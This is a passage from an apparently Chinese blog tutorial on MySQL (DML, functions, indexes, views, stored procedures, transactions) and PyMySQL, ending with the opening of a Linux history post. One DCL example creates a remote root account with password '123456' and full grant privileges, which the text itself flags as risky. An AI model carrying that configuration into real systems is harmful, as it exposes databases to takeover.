than 255 bytes, two length bytes if values may require more than 255 bytes. *Note*: MySQL follows the standard SQL specification, and does not remove trailing spaces from VARCHAR values. VARCHAR is shorthand for CHARACTER VARYING. NATIONAL VARCHAR is the standard SQL way to define that a VARCHAR column should use some predefined character set. MySQL uses utf8 as this predefined character set. http://dev.mysql.com/doc/refman/5.7/en/charset-national.html. NVARCHAR is shorthand for NATIONAL VARCHAR. URL: http://dev.mysql.com/doc/refman/5.7/en/string-type-overview.html 在数据类型的选择上，保存字符串数据通常都使用VARCHAR和CHAR两种类型，前者通常称为变长字符串，而后者通常称为定长字符串；对于InnoDB存储引擎，行存储格式没有区分固定长度和可变长度列，因此VARCHAR类型好CHAR类型没有本质区别，后者不一定比前者性能更好。如果要保存的很大字符串，可以使用TEXT类型；如果要保存很大的字节串，可以使用BLOB（二进制大对象）类型。在MySQL中，TEXT和BLOB又分别包括TEXT、MEDIUMTEXT、LONGTEXT和BLOB、MEDIUMBLOB、LONGBLOB三种不同的类型，它们主要的区别在于存储数据的最大大小不同。保存浮点数可以用FLOAT或DOUBLE类型，而保存定点数应该使用DECIMAL类型。如果要保存时间日期，DATETIME类型优于TIMESTAMP类型，因为前者能表示的时间日期范围更大。 DML -- 插入学院数据 insert into tb_college (collname, collintro) values ('计算机学院', '计算机学院1958年设立计算机专业，1981年建立计算机科学系，1998年设立计算机学院，2005年5月，为了进一步整合教学和科研资源，学校决定，计算机学院和软件学院行政班子合并统一运作、实行教学和学生管理独立运行的模式。 学院下设三个系：计算机科学与技术系、物联网工程系、计算金融系；两个研究所：图象图形研究所、网络空间安全研究院（2015年成立）；三个教学实验中心：计算机基础教学实验中心、IBM技术中心和计算机专业实验中心。'), ('外国语学院', '四川大学外国语学院设有7个教学单位，6个文理兼收的本科专业；拥有1个一级学科博士授予点，3个二级学科博士授予点，5个一级学科硕士学位授权点，5个二级学科硕士学位授权点，5个硕士专业授权领域，同时还有2个硕士专业学位（MTI）专业；有教职员工210余人，其中教授、副教授80余人，教师中获得中国国内外名校博士学位和正在职攻读博士学位的教师比例占专任教师的60%以上。'), ('经济管理学院', '四川大学经济学院前身是创办于1905年的四川大学经济科；已故经济学家彭迪先、张与九、蒋学模、胡寄窗、陶大镛、胡代光，以及当代学者刘诗白等曾先后在此任教或学习；1905年，四川大学设经济科；1924年，四川大学经济系成立；1998年，四川大学经济管理学院变更为四川大学经济学院。'); -- 插入学生数据 insert into tb_student (stuid, stuname, stusex, stubirth, stuaddr, collid) values (1001, '杨逍', 1, '1990-3-4', '四川成都', 1), (1002, '任我行', 1, '1992-2-2', '湖南长沙', 1), (1033, '王语嫣', 0, '1989-12-3', '四川成都', 1), (1572, '岳不群', 1, '1993-7-19', '陕西咸阳', 1), (1378, '纪嫣然', 0, '1995-8-12', '四川绵阳', 1), (1954, '林平之', 1, '1994-9-20', '福建莆田', 1), (2035, '东方不败', 1, '1988-6-30', null, 2), (3011, '林震南', 1, '1985-12-12', '福建莆田', 3), (3755, '项少龙', 1, '1993-1-25', null, 3), (3923, '杨不悔', 0, '1985-4-17', '四川成都', 3), (4040, '隔壁老王', 1, '1989-1-1', '四川成都', 2); -- 删除学生数据 delete from tb_student where stuid=4040; -- 更新学生数据 update tb_student set stuname='杨过', stuaddr='湖南长沙' where stuid=1001; -- 插入老师数据 insert into tb_teacher (teaid, teaname, teatitle, collid) values (1122, '张三丰', '教授', 1), (1133, '宋远桥', '副教授', 1), (1144, '杨逍', '副教授', 1), (2255, '范遥', '副教授', 2), (3366, '韦一笑', '讲师', 3); -- 插入课程数据 insert into tb_course (couid, couname, coucredit, teaid) values (1111, 'Python程序设计', 3, 1122), (2222, 'Web前端开发', 2, 1122), (3333, '操作系统', 4, 1122), (4444, '计算机网络', 2, 1133), (5555, '编译原理', 4, 1144), (6666, '算法和数据结构', 3, 1144), (7777, '经贸法语', 3, 2255), (8888, '成本会计', 2, 3366), (9999, '审计学', 3, 3366); -- 插入选课数据 insert into tb_record (sid, cid, seldate, score) values (1001, 1111, '2017-09-01', 95), (1001, 2222, '2017-09-01', 87.5), (1001, 3333, '2017-09-01', 100), (1001, 4444, '2018-09-03', null), (1001, 6666, '2017-09-02', 100), (1002, 1111, '2017-09-03', 65), (1002, 5555, '2017-09-01', 42), (1033, 1111, '2017-09-03', 92.5), (1033, 4444, '2017-09-01', 78), (1033, 5555, '2017-09-01', 82.5), (1572, 1111, '2017-09-02', 78), (1378, 1111, '2017-09-05', 82), (1378, 7777, '2017-09-02', 65.5), (2035, 7777, '2018-09-03', 88), (2035, 9999, default, null), (3755, 1111, default, null), (3755, 8888, default, null), (3755, 9999, '2017-09-01', 92); -- 查询所有学生信息 select * from tb_student; -- 查询所有课程名称及学分(投影和别名) select couname, coucredit from tb_course; select couname as 课程名称, coucredit as 学分 from tb_course; -- 查询所有学生的姓名和性别(条件运算) select stuname as 姓名, case stusex when 1 then '男' else '女' end as 性别 from tb_student; select stuname as 姓名, if(stusex, '男', '女') as 性别 from tb_student; -- 查询所有女学生的姓名和出生日期(筛选) select stuname, stubirth from tb_student where stusex=0; -- 查询所有80后学生的姓名、性别和出生日期(筛选) select stuname, stusex, stubirth from tb_student where stubirth&gt;='1980-1-1' and stubirth&lt;='1989-12-31'; select stuname, stusex, stubirth from tb_student where stubirth between '1980-1-1' and '1989-12-31'; -- 查询姓\"杨\"的学生姓名和性别(模糊) select stuname, stusex from tb_student where stuname like '杨%'; -- 查询姓\"杨\"名字两个字的学生姓名和性别(模糊) select stuname, stusex from tb_student where stuname like '杨_'; -- 查询姓\"杨\"名字三个字的学生姓名和性别(模糊) select stuname, stusex from tb_student where stuname like '杨__'; -- 查询名字中有\"不\"字或\"嫣\"字的学生的姓名(模糊) select stuname, stusex from tb_student where stuname like '%不%' or stuname like '%嫣%'; -- 查询没有录入家庭住址的学生姓名(空值) select stuname from tb_student where stuaddr is null; -- 查询录入了家庭住址的学生姓名(空值) select stuname from tb_student where stuaddr is not null; -- 查询学生选课的所有日期(去重) select distinct seldate from tb_record; -- 查询学生的家庭住址(去重) select distinct stuaddr from tb_student where stuaddr is not null; -- 查询男学生的姓名和生日按年龄从大到小排列(排序) select stuname as 姓名, datediff(curdate(), stubirth) div 365 as 年龄 from tb_student where stusex=1 order by 年龄 desc; -- 查询年龄最大的学生的出生日期(聚合函数) select min(stubirth) from tb_student; -- 查询年龄最小的学生的出生日期(聚合函数) select max(stubirth) from tb_student; -- 查询男女学生的人数(分组和聚合函数) select stusex, count(*) from tb_student group by stusex; -- 查询课程编号为1111的课程的平均成绩(筛选和聚合函数) select avg(score) from tb_record where cid=1111; -- 查询学号为1001的学生所有课程的平均分(筛选和聚合函数) select avg(score) from tb_record where sid=1001; -- 查询每个学生的学号和平均成绩(分组和聚合函数) select sid as 学号, avg(score) as 平均分 from tb_record group by sid; -- 查询平均成绩大于等于90分的学生的学号和平均成绩 -- 分组以前的筛选使用where子句 / 分组以后的筛选使用having子句 select sid as 学号, avg(score) as 平均分 from tb_record group by sid having 平均分&gt;=90; -- 查询年龄最大的学生的姓名(子查询/嵌套的查询) select stuname from tb_student where stubirth=( select min(stubirth) from tb_student ); -- 查询年龄最大的学生姓名和年龄(子查询+运算) select stuname as 姓名, datediff(curdate(), stubirth) div 365 as 年龄 from tb_student where stubirth=( select min(stubirth) from tb_student ); -- 查询选了两门以上的课程的学生姓名(子查询/分组条件/集合运算) select stuname from tb_student where stuid in ( select stuid from tb_record group by stuid having count(stuid)&gt;2 ); -- 查询学生姓名、课程名称以及成绩(连接查询) select stuname, couname, score from tb_student t1, tb_course t2, tb_record t3 where stuid=sid and couid=cid and score is not null; -- 查询学生姓名、课程名称以及成绩按成绩从高到低查询第11-15条记录(内连接+分页) select stuname, couname, score from tb_student inner join tb_record on stuid=sid inner join tb_course on couid=cid where score is not null order by score desc limit 5 offset 10; select stuname, couname, score from tb_student inner join tb_record on stuid=sid inner join tb_course on couid=cid where score is not null order by score desc limit 10, 5; -- 查询选课学生的姓名和平均成绩(子查询和连接查询) select stuname, avgmark from tb_student, ( select sid, avg(score) as avgmark from tb_record group by sid ) temp where stuid=sid; select stuname, avgmark from tb_student inner join ( select sid, avg(score) as avgmark from tb_record group by sid ) temp on stuid=sid; -- 查询每个学生的姓名和选课数量(左外连接和子查询) select stuname, ifnull(total, 0) from tb_student left outer join ( select sid, count(sid) as total from tb_record group by sid ) temp on stuid=sid; 上面的DML有几个地方需要加以说明： MySQL中支持多种类型的运算符，包括：算术运算符（+、-、*、/、%）、比较运算符（=、&lt;&gt;、&lt;=&gt;、&lt;、&lt;=、&gt;、&gt;=、BETWEEN…AND…、IN、IS NULL、IS NOT NULL、LIKE、RLIKE、REGEXP）、逻辑运算符（NOT、AND、OR、XOR）和位运算符（&amp;、|、^、~、&gt;&gt;、&lt;&lt;），我们可以在DML中使用这些运算符处理数据。 在查询数据时，可以在SELECT语句及其子句（如WHERE子句、ORDER BY子句、HAVING子句等）中使用函数，这些函数包括字符串函数、数值函数、时间日期函数、流程函数等，如下面的表格所示。 常用字符串函数。 函数 功能 CONCAT 将多个字符串连接成一个字符串 FORMAT 将数值格式化成字符串并指定保留几位小数 FROM_BASE64 / TO_BASE64 BASE64解码/编码 BIN / OCT / HEX 将数值转换成二进制/八进制/十六进制字符串 LOCATE 在字符串中查找一个子串的位置 LEFT / RIGHT 返回一个字符串左边/右边指定长度的字符 LENGTH / CHAR_LENGTH 返回字符串的长度以字节/字符为单位 LOWER / UPPER 返回字符串的小写/大写形式 LPAD / RPAD 如果字符串的长度不足，在字符串左边/右边填充指定的字符 LTRIM / RTRIM 去掉字符串前面/后面的空格 ORD / CHAR 返回字符对应的编码/返回编码对应的字符 STRCMP 比较字符串，返回-1、0、1分别表示小于、等于、大于 SUBSTRING 返回字符串指定范围的子串 常用数值函数。 函数 功能 ABS 返回一个数的绝度值 CEILING / FLOOR 返回一个数上取整/下取整的结果 CONV 将一个数从一种进制转换成另一种进制 CRC32 计算循环冗余校验码 EXP / LOG / LOG2 / LOG10 计算指数/对数 POW 求幂 RAND 返回[0,1)范围的随机数 ROUND 返回一个数四舍五入后的结果 SQRT 返回一个数的平方根 TRUNCATE 截断一个数到指定的精度 SIN / COS / TAN / COT / ASIN / ACOS / ATAN 三角函数 常用时间日期函数。 函数 功能 CURDATE / CURTIME / NOW 获取当前日期/时间/日期和时间 ADDDATE / SUBDATE 将两个日期表达式相加/相减并返回结果 DATE / TIME 从字符串中获取日期/时间 YEAR / MONTH / DAY 从日期中获取年/月/日 HOUR / MINUTE / SECOND 从时间中获取时/分/秒 DATEDIFF / TIMEDIFF 返回两个时间日期表达式相差多少天/小时 MAKEDATE / MAKETIME 制造一个日期/时间 常用流程函数。 函数 功能 IF 根据条件是否成立返回不同的值 IFNULL 如果为NULL则返回指定的值否则就返回本身 NULLIF 两个表达式相等就返回NULL否则返回第一个表达式的值 其他常用函数。 函数 功能 MD5 / SHA1 / SHA2 返回字符串对应的哈希摘要 CHARSET / COLLATION 返回字符集/校对规则 USER / CURRENT_USER 返回当前用户 DATABASE 返回当前数据库名 VERSION 返回当前数据库版本 FOUND_ROWS / ROW_COUNT 返回查询到的行数/受影响的行数 LAST_INSERT_ID 返回最后一个自增主键的值 UUID / UUID_SHORT 返回全局唯一标识符 DCL -- 创建可以远程登录的root账号并为其指定口令 create user 'root'@'%' identified by '123456'; -- 为远程登录的root账号授权操作所有数据库所有对象的所有权限并允许其将权限再次赋予其他用户 grant all privileges on *.* to 'root'@'%' with grant option; -- 创建名为hellokitty的用户并为其指定口令 create user 'hellokitty'@'%' identified by '123123'; -- 将对school数据库所有对象的所有操作权限授予hellokitty grant all privileges on school.* to 'hellokitty'@'%'; -- 召回hellokitty对school数据库所有对象的insert/delete/update权限 revoke insert, delete, update on school.* from 'hellokitty'@'%'; 说明：创建一个可以允许任意主机登录并且具有超级管理员权限的用户在现实中并不是一个明智的决定，因为一旦该账号的口令泄露或者被破解，数据库将会面临灾难级的风险。 索引索引是关系型数据库中用来提升查询性能最为重要的手段。关系型数据库中的索引就像一本书的目录，我们可以想象一下，如果要从一本书中找出某个知识点，但是这本书没有目录，这将是意见多么可怕的事情（我们估计得一篇一篇的翻下去，才能确定这个知识点到底在什么位置）。创建索引虽然会带来存储空间上的开销，就像一本书的目录会占用一部分的篇幅一样，但是在牺牲空间后换来的查询时间的减少也是非常显著的。 MySQL中，所有数据类型的列都可以被索引，常用的存储引擎InnoDB和MyISAM能支持每个表创建16个索引。InnoDB和MyISAM使用的索引其底层算法是B-tree（B树），B-tree是一种自平衡的树，类似于平衡二叉排序树，能够保持数据有序。这种数据结构能够让查找数据、顺序访问、插入数据及删除的操作都在对数时间内完成。 接下来我们通过一个简单的例子来说明索引的意义，比如我们要根据学生的姓名来查找学生，这个场景在实际开发中应该经常遇到，就跟通过商品名称查找商品道理是一样的。我们可以使用MySQL的explain关键字来查看SQL的执行计划。 explain select * from tb_student where stuname='林震南'\\G *************************** 1. row *************************** id: 1 select_type: SIMPLE table: tb_student partitions: NULL type: ALL possible_keys: NULL key: NULL key_len: NULL ref: NULL rows: 11 filtered: 10.00 Extra: Using where 1 row in set, 1 warning (0.00 sec) 在上面的SQL执行计划中，有几项值得我们关注： type：MySQL在表中找到满足条件的行的方式，也称为访问类型，包括：ALL（全表扫描）、index（索引全扫描）、range（索引范围扫描）、ref（非唯一索引扫描）、eq_ref（唯一索引扫描）、const/system、NULL。在所有的访问类型中，很显然ALL是性能最差的，它代表了全表扫描是指要扫描表中的每一行才能找到匹配的行。 possible_keys：MySQL可以选择的索引，但是有可能不会使用。 key：MySQL真正使用的索引。 rows：执行查询需要扫描的行数，这是一个预估值。 从上面的执行计划可以看出，当我们通过学生名字查询学生时实际上是进行了全表扫描，不言而喻这个查询性能肯定是非常糟糕的，尤其是在表中的行很多的时候。如果我们需要经常通过学生姓名来查询学生，那么就应该在学生姓名对应的列上创建索引，通过索引来加速查询。 create index idx_student_name on tb_student(stuname); 再次查看刚才的SQL对应的执行计划。 explain select * from tb_student where stuname='林震南'\\G *************************** 1. row *************************** id: 1 select_type: SIMPLE table: tb_student partitions: NULL type: ref possible_keys: idx_student_name key: idx_student_name key_len: 62 ref: const rows: 1 filtered: 100.00 Extra: NULL 1 row in set, 1 warning (0.00 sec) 可以注意到，在对学生姓名创建索引后，刚才的查询已经不是全表扫描而是基于索引的查询，而且扫描的行只有唯一的一行，这显然大大的提升了查询的性能。MySQL中还允许创建前缀索引，即对索引字段的前N个字符创建索引，这样的话可以减少索引占用的空间（但节省了空间很有可能会浪费时间，时间和空间是不可调和的矛盾），如下所示。 create index idx_student_name_1 on tb_student(stuname(1)); 上面的索引相当于是根据学生姓名的第一个字来创建的索引，我们再看看SQL执行计划。 explain select * from tb_student where stuname='林震南'\\G *************************** 1. row *************************** id: 1 select_type: SIMPLE table: tb_student partitions: NULL type: ref possible_keys: idx_student_name key: idx_student_name key_len: 5 ref: const rows: 2 filtered: 100.00 Extra: Using where 1 row in set, 1 warning (0.00 sec) 不知道大家是否注意到，这一次扫描的行变成了2行，因为学生表中有两个姓“林”的学生，我们只用姓名的第一个字作为索引的话，在查询时通过索引就会找到这两行。 如果要删除索引，可以使用下面的SQL。 alter table tb_student drop index idx_student_name; 或者 drop index idx_student_name on tb_student; 我们简单的为大家总结一下索引的设计原则： 最适合索引的列是出现在WHERE子句和连接子句中的列。 索引列的基数越大（取值多重复值少），索引的效果就越好。 使用前缀索引可以减少索引占用的空间，内存中可以缓存更多的索引。 索引不是越多越好，虽然索引加速了读操作（查询），但是写操作（增、删、改）都会变得更慢，因为数据的变化会导致索引的更新，就如同书籍章节的增删需要更新目录一样。 使用InnoDB存储引擎时，表的普通索引都会保存主键的值，所以主键要尽可能选择较短的数据类型，这样可以有效的减少索引占用的空间，利用提升索引的缓存效果。 最后，还有一点需要说明，InnoDB使用的B-tree索引，数值类型的列除了等值判断时索引会生效之外，使用&gt;、&lt;、&gt;=、&lt;=、BETWEEN…AND… 、&lt;&gt;时，索引仍然生效；对于字符串类型的列，如果使用不以通配符开头的模糊查询，索引也是起作用的，但是其他的情况会导致索引失效，这就意味着很有可能会做全表查询。 视图视图是关系型数据库中将一组查询指令构成的结果集组合成可查询的数据表的对象。简单的说，视图就是虚拟的表，但与数据表不同的是，数据表是一种实体结构，而视图是一种虚拟结构，你也可以将视图理解为保存在数据库中被赋予名字的SQL语句。 使用视图可以获得以下好处： 可以将实体数据表隐藏起来，让外部程序无法得知实际的数据结构，让访问者可以使用表的组成部分而不是整个表，降低数据库被攻击的风险。 在大多数的情况下视图是只读的（更新视图的操作通常都有诸多的限制），外部程序无法直接透过视图修改数据。 重用SQL语句，将高度复杂的查询包装在视图表中，直接访问该视图即可取出需要的数据；也可以将视图视为数据表进行连接查询。 视图可以返回与实体数据表不同格式的数据， 创建视图。 create view vw_avg_score as select sid, round(avg(score), 1) as avgscore from tb_record group by sid; create view vw_student_score as select stuname, avgscore from tb_student, vw_avg_score where stuid=sid; 提示：因为视图不包含数据，所以每次使用视图时，都必须执行查询以获得数据，如果你使用了连接查询、嵌套查询创建了较为复杂的视图，你可能会发现查询性能下降得很厉害。因此，在使用复杂的视图前，应该进行测试以确保其性能能够满足应用的需求。 使用视图。 select stuname, avgscore from vw_student_score order by avgscore desc; +--------------+----------+ | stuname | avgscore | +--------------+----------+ | 杨过 | 95.6 | | 任我行 | 53.5 | | 王语嫣 | 84.3 | | 纪嫣然 | 73.8 | | 岳不群 | 78.0 | | 东方不败 | 88.0 | | 项少龙 | 92.0 | +--------------+----------+ 既然视图是一张虚拟的表，那么视图的中的数据可以更新吗？视图的可更新性要视具体情况而定，以下类型的视图是不能更新的： 使用了聚合函数（SUM、MIN、MAX、AVG、COUNT等）、DISTINCT、GROUP BY、HAVING、UNION或者UNION ALL的视图。 SELECT中包含了子查询的视图。 FROM子句中包含了一个不能更新的视图的视图。 WHERE子句的子查询引用了FROM子句中的表的视图。 删除视图。 drop view vw_student_score; 说明：如果希望更新视图，可以先用上面的命令删除视图，也可以通过create or replace view来更新视图。 视图的规则和限制。 视图可以嵌套，可以利用从其他视图中检索的数据来构造一个新的视图。视图也可以和表一起使用。 创建视图时可以使用order by子句，但如果从视图中检索数据时也使用了order by，那么该视图中原先的order by会被覆盖。 视图无法使用索引，也不会激发触发器（实际开发中因为性能等各方面的考虑，通常不建议使用触发器，所以我们也不对这个概念进行介绍）的执行。 存储过程存储过程是事先编译好存储在数据库中的一组SQL的集合，调用存储过程可以简化应用程序开发人员的工作，减少与数据库服务器之间的通信，对于提升数据操作的性能也是有帮助的。其实迄今为止，我们使用的SQL语句都是针对一个或多个表的单条语句，但在实际开发中经常会遇到某个操作需要多条SQL语句才能完成的情况。例如，电商网站在受理用户订单时，需要做以下一系列的处理。 通过查询来核对库存中是否有对应的物品以及库存是否充足。 如果库存有物品，需要锁定库存以确保这些物品不再卖给别人， 并且要减少可用的物品数量以反映正确的库存量。 如果库存不足，可能需要进一步与供应商进行交互或者至少产生一条系统提示消息。 不管受理订单是否成功，都需要产生流水记录，而且需要给对应的用户产生一条通知信息。 我们可以通过存储过程将复杂的操作封装起来，这样不仅有助于保证数据的一致性，而且将来如果业务发生了变动，只需要调整和修改存储过程即可。对于调用存储过程的用户来说，存储过程并没有暴露数据表的细节，而且执行存储过程比一条条的执行一组SQL要快得多。 下面的存储过程实现了查询某门课程的最高分、最低分和平均分。 drop procedure if exists sp_score_by_cid; delimiter $$ create procedure sp_score_by_cid( courseId int, out maxScore decimal(4,1), out minScore decimal(4,1), out avgScore decimal(4,1) ) begin select max(score) into maxScore from tb_record where cid=courseId; select min(score) into minScore from tb_record where cid=courseId; select avg(score) into avgScore from tb_record where cid=courseId; end $$ delimiter ; call sp_score_by_cid(1111, @a, @b, @c); select @a, @b, @c; 说明：在定义存储过程时，因为可能需要书写多条SQL，而分隔这些SQL需要使用分号作为分隔符，如果这个时候，仍然用分号表示整段代码结束，那么定义存储过程的SQL就会出现错误，所以上面我们用delimiter $$将整段代码结束的标记定义为$$，那么代码中的分号将不再表示整段代码的结束，需要马上执行，整段代码在遇到end $$时才输入完成并执行。在定义完存储过程后，通过delimiter ;将结束符重新改回成分号。 上面定义的存储过程有四个参数，其中第一个参数是输入参数，代表课程的编号，后面的参数都是输出参数，因为存储过程不能定义返回值，只能通过输出参数将执行结果带出，定义输出参数的关键字是out，默认情况下参数都是输入参数。 调用存储过程。 call sp_score_by_cid(1111, @a, @b, @c); 获取输出参数的值。 select @a as 最高分, @b as 最低分, @c as 平均分; 删除存储过程。 drop procedure sp_score_by_cid; 在存储过程中，我们可以定义变量、条件，可以使用分支和循环语句，可以通过游标操作查询结果，还可以使用事件调度器，这些内容我们暂时不在此处进行介绍。虽然我们说了很多存储过程的好处，但是在实际开发中，如果过度的使用存储过程，将大量复杂的运算放到存储过程中，也会导致占用数据库服务器的CPU资源，造成数据库服务器承受巨大的压力。为此，我们一般会将复杂的运算和处理交给应用服务器，因为很容易部署多台应用服务器来分摊这些压力。 几个重要的概念范式理论 - 设计二维表的指导思想 第一范式：数据表的每个列的值域都是由原子值组成的，不能够再分割。 第二范式：数据表里的所有数据都要和该数据表的键（主键与候选键）有完全依赖关系。 第三范式：所有非键属性都只和候选键有相关性，也就是说非键属性之间应该是独立无关的。 数据完整性 实体完整性 - 每个实体都是独一无二的 主键（primary key） / 唯一约束 / 唯一索引（unique） 引用完整性（参照完整性）- 关系中不允许引用不存在的实体 外键（foreign key） 域完整性 - 数据是有效的 数据类型及长度 非空约束（not null） 默认值约束（default） 检查约束（check） 说明：在MySQL数据库中，检查约束并不起作用。 数据一致性 事务：一系列对数据库进行读/写的操作，这些操作要么全都成功，要么全都失败。 事务的ACID特性 原子性：事务作为一个整体被执行，包含在其中的对数据库的操作要么全部被执行，要么都不执行 一致性：事务应确保数据库的状态从一个一致状态转变为另一个一致状态 隔离性：多个事务并发执行时，一个事务的执行不应影响其他事务的执行 持久性：已被提交的事务对数据库的修改应该永久保存在数据库中 MySQL中的事务操作 开启事务环境 start transaction 或 begin 提交事务 commit 回滚事务 rollback 其他内容大家应该能够想到，关于MySQL的知识肯定远远不止上面列出的这些，比如MySQL的性能优化、管理和维护MySQL的相关工具、MySQL数据的备份和恢复、监控MySQL、部署高可用架构等问题我们在这里都没有进行讨论。当然，这些内容也都是跟项目开发密切相关的，我们就留到后续的章节中再续点进行讲解。 Python数据库编程我们用如下所示的数据库来演示在Python中如何访问MySQL数据库。 drop database if exists hrs; create database hrs default charset utf8; use hrs; drop table if exists tb_emp; drop table if exists tb_dept; create table tb_dept ( dno int not null comment '编号', dname varchar(10) not null comment '名称', dloc varchar(20) not null comment '所在地', primary key (dno) ); insert into tb_dept values (10, '会计部', '北京'), (20, '研发部', '成都'), (30, '销售部', '重庆'), (40, '运维部', '深圳'); create table tb_emp ( eno int not null comment '员工编号', ename varchar(20) not null comment '员工姓名', job varchar(20) not null comment '员工职位', mgr int comment '主管编号', sal int not null comment '员工月薪', comm int comment '每月补贴', dno int comment '所在部门编号', primary key (eno) ); alter table tb_emp add constraint fk_emp_dno foreign key (dno) references tb_dept (dno); insert into tb_emp values (7800, '张三丰', '总裁', null, 9000, 1200, 20), (2056, '乔峰', '分析师', 7800, 5000, 1500, 20), (3088, '李莫愁', '设计师', 2056, 3500, 800, 20), (3211, '张无忌', '程序员', 2056, 3200, null, 20), (3233, '丘处机', '程序员', 2056, 3400, null, 20), (3251, '张翠山', '程序员', 2056, 4000, null, 20), (5566, '宋远桥', '会计师', 7800, 4000, 1000, 10), (5234, '郭靖', '出纳', 5566, 2000, null, 10), (3344, '黄蓉', '销售主管', 7800, 3000, 800, 30), (1359, '胡一刀', '销售员', 3344, 1800, 200, 30), (4466, '苗人凤', '销售员', 3344, 2500, null, 30), (3244, '欧阳锋', '程序员', 3088, 3200, null, 20), (3577, '杨过', '会计', 5566, 2200, null, 10), (3588, '朱九真', '会计', 5566, 2500, null, 10); 在Python 3中，我们通常使用纯Python的三方库PyMySQL来访问MySQL数据库，它应该是目前Python操作MySQL数据库最好的选择。 安装PyMySQL。 pip install pymysql 添加一个部门。 import pymysql def main(): no = int(input('编号: ')) name = input('名字: ') loc = input('所在地: ') # 1. 创建数据库连接对象 con = pymysql.connect(host='localhost', port=3306, database='hrs', charset='utf8', user='yourname', password='yourpass') try: # 2. 通过连接对象获取游标 with con.cursor() as cursor: # 3. 通过游标执行SQL并获得执行结果 result = cursor.execute( 'insert into tb_dept values (%s, %s, %s)', (no, name, loc) ) if result == 1: print('添加成功!') # 4. 操作成功提交事务 con.commit() finally: # 5. 关闭连接释放资源 con.close() if __name__ == '__main__': main() 删除一个部门。 import pymysql def main(): no = int(input('编号: ')) con = pymysql.connect(host='localhost', port=3306, database='hrs', charset='utf8', user='yourname', password='yourpass', autocommit=True) try: with con.cursor() as cursor: result = cursor.execute( 'delete from tb_dept where dno=%s', (no, ) ) if result == 1: print('删除成功!') finally: con.close() if __name__ == '__main__': main() 说明：如果不希望每次SQL操作之后手动提交或回滚事务，可以像上面的代码那样，在创建连接的时候多加一个名为autocommit的参数并将它的值设置为True，表示每次执行SQL之后自动提交。如果程序中不需要使用事务环境也不希望手动的提交或回滚就可以这么做。 更新一个部门。 import pymysql def main(): no = int(input('编号: ')) name = input('名字: ') loc = input('所在地: ') con = pymysql.connect(host='localhost', port=3306, database='hrs', charset='utf8', user='yourname', password='yourpass', autocommit=True) try: with con.cursor() as cursor: result = cursor.execute( 'update tb_dept set dname=%s, dloc=%s where dno=%s', (name, loc, no) ) if result == 1: print('更新成功!') finally: con.close() if __name__ == '__main__': main() 查询所有部门。 import pymysql from pymysql.cursors import DictCursor def main(): con = pymysql.connect(host='localhost', port=3306, database='hrs', charset='utf8', user='yourname', password='yourpass') try: with con.cursor(cursor=DictCursor) as cursor: cursor.execute('select dno as no, dname as name, dloc as loc from tb_dept') results = cursor.fetchall() print(results) print('编号\\t名称\\t\\t所在地') for dept in results: print(dept['no'], end='\\t') print(dept['name'], end='\\t') print(dept['loc']) finally: con.close() if __name__ == '__main__': main() 分页查询员工信息。 import pymysql from pymysql.cursors import DictCursor class Emp(object): def __init__(self, no, name, job, sal): self.no = no self.name = name self.job = job self.sal = sal def __str__(self): return f'\\n编号：{self.no}\\n姓名：{self.name}\\n职位：{self.job}\\n月薪：{self.sal}\\n' def main(): page = int(input('页码: ')) size = int(input('大小: ')) con = pymysql.connect(host='localhost', port=3306, database='hrs', charset='utf8', user='yourname', password='yourpass') try: with con.cursor() as cursor: cursor.execute( 'select eno as no, ename as name, job, sal from tb_emp limit %s,%s', ((page - 1) * size, size) ) for emp_tuple in cursor.fetchall(): emp = Emp(*emp_tuple) print(emp) finally: con.close() if __name__ == '__main__': main()","categories":[],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"http://www.xiaocaibi.top/tags/Mysql/"}]},{"title":"31-35.玩转Linux操作系统","slug":"31-35-玩转Linux操作系统","date":"2021-05-22T01:42:07.000Z","updated":"2021-09-20T08:47:43.948Z","comments":true,"path":"posts/b73a2324.html","link":"","permalink":"http://www.xiaocaibi.top/posts/b73a2324.html","excerpt":"","text":"玩转Linux操作系统 说明：本文中对Linux命令的讲解都是基于名为CentOS的Linux发行版本，我自己使用的是阿里云服务器，系统版本为CentOS Linux release 7.6.1810。不同的Linux发行版本在Shell命令和工具程序上会有一些差别，但是这些差别是很小的。 操作系统发展史只有硬件没有软件的计算机系统被称之为“裸机”，我们很难用“裸机”来完成计算机日常的工作（如存储和运算），所以必须用特定的软件来控制硬件的工作。最靠近计算机硬件的软件是系统软件，其中最为重要的就是“操作系统”。“操作系统”是控制和管理整个计算机硬件和软件资源、实现资源分配和任务调配、为系统用户以及其他软件提供接口和环境的程序的集合。 没有操作系统（手工操作）在计算机诞生之初没有操作系统的年代，人们先把程序纸带（或卡片）装上计算机，然后启动输入机把程序送入计算机，接着通过控制台开关启动程序运行。当程序执行完毕，打印机输出计算的结果，用户卸下并取走纸带（或卡片）。第二个用户上机，重复同样的步骤。在整个过程中用户独占机器，CPU等待手工操作，资源利用率极低。 批处理系统首先启动计算机上的一个监督程序，在监督程序的控制下，计算机能够自动的、成批的处理一个或多个用户的作业。完成一批作业后，监督程度又从输入机读取作业存入磁带机。按照上面的步骤重复处理任务。监督程序不停的处理各个作业，实现了作业的自动转接，减少了作业的建立时间和手工操作时间，提高了计算机资源的利用率。&nbsp;批处理系统又可以分为单道批处理系统、多道批处理系统、联机批处理系统、脱机批处理系统。 分时系统和实时系统分时系统是把处理器的运行时间分成很短的时间片，按时间片轮流把处理机分配给各联机作业使用。 若某个作业在分配给它的时间片内不能完成其计算，则该作业暂时中断，把处理机让给另一作业使用，等待下一轮调度时再继续其运行。由于计算机速度很快，作业运行轮转得很快，给每个用户的感觉是他独占了一台计算机。而每个用户可以通过自己的终端向系统发出各种操作控制命令，在充分的人机交互情况下，完成作业的运行。为了解决分时系统不能及时响应用户指令的情况，又出现了能够在在严格的时间范围内完成事件处理，及时响应随机外部事件的实时系统。 通用操作系统 1960s：IBM的System/360系列的机器有了统一的操作系统OS/360。 1965年：AT&amp;T的贝尔实验室加入GE和MIT的合作计划开始开发MULTICS。 1969年：MULTICS项目失败，Ken Tompson赋闲在家，为了玩“Space Travel”游戏用汇编语言在当时已经被淘汰的PDP-7上开发了Unics。 注：很难想象，Unix这么伟大的系统，居然是一个赋闲在家的程序员（关键是老婆回娘家还带上了孩子）在一台被淘汰的设备上为了玩游戏开发出来的。 1970年~1971年：Ken Tompson和Dennis Ritchie用B语言在PDP-11上重写了Unics，并在Brian Kernighan的建议下将其更名为Unix。 1972年~1973年：Dennis Ritchie发明了C语言来取代可移植性较差的B语言，并开启了用C语言重写Unix的工作。 